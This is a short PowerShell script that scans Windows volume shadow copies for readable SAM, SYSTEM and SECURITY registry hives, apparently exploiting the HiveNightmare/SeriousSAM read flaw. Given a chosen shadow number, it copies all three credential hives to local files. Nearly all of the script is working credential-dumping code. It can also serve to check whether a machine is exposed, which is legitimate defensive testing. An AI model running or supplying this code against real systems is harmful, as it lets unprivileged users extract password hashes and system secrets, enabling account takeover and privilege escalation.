param ([int] $dump=0)

class Shadow {
    [int]$VulnerableShadowNumber
    [datetime]$SamLastModified
    [datetime]$SystemLastModified
    [datetime]$SecurityLastModified

    Shadow([int]$shadowNumber, [datetime]$sam, [datetime]$system, [datetime]$security ) {
        $this.VulnerableShadowNumber = $shadowNumber
        $this.SamLastModified = $sam
        $this.SystemLastModified = $system
        $this.SecurityLastModified = $security
    }
}

$shadows = @()

$base = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"
foreach ($i in 1..100) {
    $samPath = $base + $i + "\\Windows\System32\config\SAM"
    $systemPath = $base + $i + "\\Windows\System32\config\SYSTEM"
    $securityPath = $base + $i + "\\Windows\System32\config\SECURITY"
    $sam = Get-Item -LiteralPath $samPath
    $system = Get-Item -LiteralPath $systemPath
    $security = Get-Item -LiteralPath $securityPath
    if ($sam.Exists) {
        $content = Get-Content -LiteralPath $samPath -ErrorVariable error -Raw
        if (-not $error) {
            $shadows += [Shadow]::new($i, $sam.LastWriteTime, $system.LastWriteTime, $security.LastWriteTime)
            if ($i -eq $dump) {
                Write-Host "Dumping selected hive"
                Set-Content -Path "sam.hive" -NoNewline -Value $content
                Set-Content -Path "system.hive" -NoNewline -Value (Get-Content -LiteralPath $systemPath -Raw) 
                Set-Content -Path "security.hive" -NoNewline -Value (Get-Content -LiteralPath $securityPath -Raw) 
            }
        }
    }
}

return $shadows
